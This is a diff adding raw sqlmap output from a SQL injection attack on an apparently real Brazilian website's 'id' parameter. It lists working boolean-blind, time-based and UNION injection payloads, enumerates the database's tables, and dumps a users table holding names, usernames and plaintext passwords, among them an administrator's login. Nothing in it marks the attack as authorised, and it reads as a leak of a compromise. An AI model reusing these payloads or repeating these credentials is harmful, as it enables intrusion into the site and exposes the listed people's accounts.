@@ -1,0 +1,137 @@
+sqlmap identified the following injection point(s) with a total of 107 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: conteudo=empresa&id=70 AND 7141=7141
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: conteudo=empresa&id=70 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: conteudo=empresa&id=-1472 UNION ALL SELECT NULL,NULL,CONCAT(0x7176767a71,0x6b6e4f416e5a6143525271636b6e4d62564d69734a5a76474744574354474e6a58634f6858625045,0x71707a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KcvY
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.2.0
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] information_schema
+[*] sitecaxiense
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: conteudo=empresa&id=70 AND 7141=7141
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: conteudo=empresa&id=70 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: conteudo=empresa&id=-1472 UNION ALL SELECT NULL,NULL,CONCAT(0x7176767a71,0x6b6e4f416e5a6143525271636b6e4d62564d69734a5a76474744574354474e6a58634f6858625045,0x71707a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KcvY
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.2.0
+back-end DBMS: MySQL >= 5.0.12
+Database: sitecaxiense
+[14 tables]
++--------------------+
+| banners            |
+| categorias         |
+| cidades            |
+| colunas_busca      |
+| empregos           |
+| enquetes           |
+| linhas             |
+| linhas_onibus      |
+| linhas_treixos     |
+| modalidades        |
+| noticias           |
+| poder              |
+| respostas_enquetes |
+| usuarios           |
++--------------------+
+
+Database: sitecaxiense
++--------------------+---------+
+| Table              | Entries |
++--------------------+---------+
+| linhas_onibus      | 788     |
+| linhas_treixos     | 314     |
+| cidades            | 31      |
+| linhas             | 12      |
+| noticias           | 12      |
+| respostas_enquetes | 12      |
+| modalidades        | 10      |
+| usuarios           | 6       |
+| categorias         | 3       |
+| enquetes           | 3       |
+| banners            | 2       |
+| colunas_busca      | 2       |
+| empregos           | 2       |
+| poder              | 2       |
++--------------------+---------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: conteudo=empresa&id=70 AND 7141=7141
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: conteudo=empresa&id=70 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: conteudo=empresa&id=-1472 UNION ALL SELECT NULL,NULL,CONCAT(0x7176767a71,0x6b6e4f416e5a6143525271636b6e4d62564d69734a5a76474744574354474e6a58634f6858625045,0x71707a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KcvY
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.2.0
+back-end DBMS: MySQL >= 5.0.12
+Database: sitecaxiense
+Table: usuarios
+[6 entries]
++----+--------------+-----------+----------+-------------+----------------+
+| id | nome         | senha     | username | senha_admin | confirma_senha |
++----+--------------+-----------+----------+-------------+----------------+
+| 15 | admin        | @caxiense | admin    | ellite      | @caxiense      |
+| 16 | ellite1      | ellite87  | ellite1  | ellite2     | ellite87       |
+| 18 | Jonathan     | 12345     | jonathan | -           | 12345          |
+| 19 | Thiago Silva | @thiago   | thiago   | -           | @thiago        |
+| 20 | RH           | expresso  | rh       | -           | expresso       |
+| 21 | Ruth Paim    | thais     | ruth     | -           | thais          |
++----+--------------+-----------+----------+-------------+----------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: conteudo=empresa&id=70 AND 7141=7141
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: conteudo=empresa&id=70 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: conteudo=empresa&id=-1472 UNION ALL SELECT NULL,NULL,CONCAT(0x7176767a71,0x6b6e4f416e5a6143525271636b6e4d62564d69734a5a76474744574354474e6a58634f6858625045,0x71707a6b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KcvY
+    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache, PHP 5.2.0
+back-end DBMS: MySQL >= 5.0.12
